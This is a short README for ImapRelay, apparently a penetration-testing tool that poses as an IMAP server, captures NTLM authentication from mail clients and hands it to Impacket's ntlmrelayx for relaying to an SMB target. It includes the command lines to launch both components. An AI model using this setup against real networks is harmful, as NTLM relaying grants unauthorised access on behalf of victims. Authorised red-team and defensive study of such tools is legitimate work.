# ImapRelay

Small IMAP STARTTLS/NTLM frontend for Impacket's RAW relay listener. It passes NTLM messages to the relay and returns the relay result to the mail client. The code uses only the Python standard library.

Run Impacket with its RAW listener enabled, then start the frontend with a certificate and key for the hostname the mail client uses:

```sh
impacket-ntlmrelayx -t smb://TARGET -ip 127.0.0.1 --no-smb-server --no-http-server --no-wcf-server --no-rpc-server --no-winrm-server
sudo python3 imaprelay.py --listen-host 0.0.0.0 --listen-port 143 --relay-host 127.0.0.1 --relay-port 6666 --cert server.pem --key server.key
```

Use `--implicit-tls --listen-port 993` for IMAPS. The default listener is `127.0.0.1:1143`. The frontend accepts NTLM only after TLS and does not handle password authentication. Relay targets, signing requirements, and the action after authentication are controlled by Impacket.
